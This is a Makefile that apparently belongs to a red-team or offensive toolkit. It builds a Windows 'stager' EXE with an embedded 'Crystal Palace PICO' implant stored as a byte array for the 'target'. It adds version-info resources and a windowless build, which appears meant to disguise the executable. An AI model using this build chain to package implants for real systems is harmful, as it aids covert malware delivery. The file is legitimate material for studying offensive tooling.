# stager Makefile
#
# Build a self-contained Windows EXE stager with the Crystal Palace PICO
# embedded as a byte array.  No second file required on the target.
#
# Usage:
#   make PICO=/path/to/implant.crystal.bin
#   make PICO=/path/to/implant.crystal.bin OUTPUT=/path/to/stager.exe
#
# PICO is required; OUTPUT defaults to ../build/stager.exe.

CC      := x86_64-w64-mingw32-gcc
WINDRES := x86_64-w64-mingw32-windres
CFLAGS  := -Wall -Os -mwindows
LDFLAGS := -ladvapi32

PICO   ?= $(error PICO is not set — run: make PICO=/path/to/implant.crystal.bin)
OUTPUT ?= ../build/stager.exe

.PHONY: all clean

all: $(OUTPUT)

# ── Step 1: embed PICO as C byte array ────────────────────────────────────────
pico_payload.h: $(PICO)
	xxd -i $< | sed 's/unsigned char [a-zA-Z0-9_]*/unsigned char pico_payload/;s/unsigned int [a-zA-Z0-9_]*/unsigned int pico_payload_len/' > $@

# ── Step 2: compile version info resource ─────────────────────────────────────
resource.o: resource.rc
	$(WINDRES) resource.rc -o resource.o

# ── Step 3: link final EXE ────────────────────────────────────────────────────
$(OUTPUT): stager.c pico_payload.h resource.o
	@mkdir -p "$(dir $(OUTPUT))"
	$(CC) $(CFLAGS) -o "$@" stager.c resource.o $(LDFLAGS)

clean:
	rm -f pico_payload.h resource.o
